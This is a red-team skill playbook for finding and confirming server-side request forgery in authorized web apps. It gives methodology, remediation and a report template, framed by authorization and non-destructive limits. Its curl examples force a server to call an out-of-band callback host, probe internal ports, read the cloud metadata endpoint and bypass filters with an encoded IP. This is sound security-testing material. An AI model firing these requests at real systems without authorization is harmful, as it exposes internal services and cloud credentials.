---
name: ssrf-testing
description: Detect and safely confirm Server-Side Request Forgery in authorized web apps and APIs — including blind SSRF and cloud metadata access — using controlled out-of-band callbacks, with impact assessment and remediation.
version: 1.0.0
category: red-team
tags: [web-security, ssrf, api-security, cloud, owasp-top-10]
authorization_required: true
destructive: false
mitre_attack: [T1190, T1557]
owasp: [A10:2021]
cwe: [CWE-918]
references:
  - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
  - https://cwe.mitre.org/data/definitions/918.html
  - https://portswigger.net/web-security/ssrf
---

# SSRF Testing

## Purpose
Identify and confirm Server-Side Request Forgery (SSRF) in an authorized target —
where the server can be coerced into making requests to attacker-chosen
destinations — and assess impact (internal service access, cloud metadata,
port scanning) with controlled, non-destructive proofs.

## Prerequisites
- Signed authorization and in-scope application/API list.
- Intercepting proxy (Burp/ZAP), `curl`, and an **out-of-band (OOB) interaction
  server** you control (e.g., Burp Collaborator or a self-hosted DNS/HTTP canary).
- Understanding of URL parsing quirks, internal network ranges, and cloud
  metadata endpoints.

## Scope & Authorization
- Require written authorization; SSRF can reach **internal** systems — confirm
  that internal pivoting and cloud-metadata testing are in scope.
- **Non-destructive.** Use SSRF to *prove* reachability (an OOB callback, a
  benign internal response) — do not exfiltrate secrets at scale, pivot into
  further exploitation, or disrupt internal services without explicit sign-off.
- Use OOB infrastructure **you own**; never point callbacks at third parties.
- If cloud metadata (e.g., `169.254.169.254`) is reachable, capture minimal proof
  (presence of the endpoint) rather than harvesting credentials.

## Methodology
1. **Find request-issuing features** — URL fetchers, webhooks, PDF/image
   generators, link previews, import-from-URL, SSO/OIDC metadata, file-by-URL.
2. **Baseline** — observe how the app handles a normal external URL you control
   (does it fetch? what does the response look like?).
3. **In-band SSRF** — point the parameter at your OOB server; confirm the
   callback and reflected response.
4. **Blind SSRF** — when no response is reflected, rely solely on OOB DNS/HTTP
   interactions to confirm.
5. **Internal reachability** — test access to localhost/internal ranges and
   common internal ports (carefully, scoped).
6. **Cloud metadata** — test provider metadata endpoints if cloud-hosted.
7. **Filter bypass analysis** — alternate encodings, redirects, DNS rebinding,
   IPv6/decimal/octal IP forms — to gauge control strength.

## Execution Workflow
> `OOB="https://<your-collaborator-id>.oob.example"`. Use your own OOB host.
> Keep internal probing minimal and in scope.

```bash
# 1. In-band: does the server fetch your OOB URL?
curl -s "https://example.com/fetch?url=${OOB}/probe1" -o /dev/null -w "%{http_code}\n"
#    Check your OOB server for the inbound request (confirms SSRF).

# 2. Blind SSRF via a webhook/import field (no reflected body):
curl -s -X POST "https://example.com/api/import" \
  -H "Content-Type: application/json" \
  -d "{\"source\":\"${OOB}/blind1\"}"
#    Confirm via OOB DNS/HTTP hit only.

# 3. Internal reachability (scoped): differential responses/timing
curl -s "https://example.com/fetch?url=http://127.0.0.1:80/"   -o /dev/null -w "%{http_code} %{time_total}\n"
curl -s "https://example.com/fetch?url=http://127.0.0.1:3306/" -o /dev/null -w "%{http_code} %{time_total}\n"

# 4. Cloud metadata presence (capture minimal proof, do not harvest creds):
curl -s "https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/" | head -c 200

# 5. Filter bypass probes (illustrative): redirect, alternate IP encodings
curl -s "https://example.com/fetch?url=http://2130706433/"   # 127.0.0.1 as decimal
```

## Validation
- In-band SSRF: confirmed by a matching OOB callback **and/or** a response body
  proving the fetch occurred.
- Blind SSRF: confirmed **only** by an OOB interaction tied to your unique token.
- Internal access: confirm via consistent differential responses/timing between
  open and closed ports, reproducibly.
- Record the exact request, the OOB evidence, and the reached destination.

## Expected Output
- Per finding: endpoint/parameter, SSRF type (in-band/blind), reachable
  destinations (internal/metadata), OOB proof, severity (CVSS), remediation.
- An inventory of request-issuing features tested.
- Evidence: OOB interaction logs, proxy history, minimal response captures.

## False Positives
- The app fetching your URL **client-side** (in the browser) is not SSRF —
  confirm the request originates from the **server**.
- OOB hits from scanners/previews unrelated to your token — use unique subdomains.
- Timing differences from caching/load rather than internal reachability — retest.
- Metadata "access" that is actually a generic error page — verify real content.

## Remediation
- Enforce an **allow-list** of permitted destinations/schemes/ports; deny by
  default. Avoid user-controlled URLs where possible.
- Resolve and validate the target IP **after** DNS resolution and block internal/
  link-local/metadata ranges (127.0.0.0/8, 169.254.0.0/16, RFC 1918, ::1) —
  re-validate on each redirect to defeat DNS rebinding.
- Disable unused URL schemes (`file://`, `gopher://`, `dict://`).
- Require IMDSv2 (session-oriented) on AWS and restrict metadata access;
  equivalent hardening on other clouds.
- Isolate request-issuing services with egress firewall rules; log outbound
  requests and alert on internal/metadata destinations.

## Reporting
```
Finding: Server-Side Request Forgery in <endpoint> parameter <param>
Authorization: <id>   OWASP: A10:2021   CWE-918   Severity: <CVSS>
Type: <in-band | blind>
Proof: <request> -> <OOB callback id / response showing server-side fetch>
Reachable: <internal hosts/ports / cloud metadata> (minimal proof)
Impact: <internal access / potential credential exposure>
Remediation: allow-list, post-resolution IP validation, IMDSv2, egress controls
Evidence: <OOB logs, captures>
```

## References
- OWASP A10:2021 SSRF:
  https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
- CWE-918: https://cwe.mitre.org/data/definitions/918.html
- PortSwigger SSRF: https://portswigger.net/web-security/ssrf
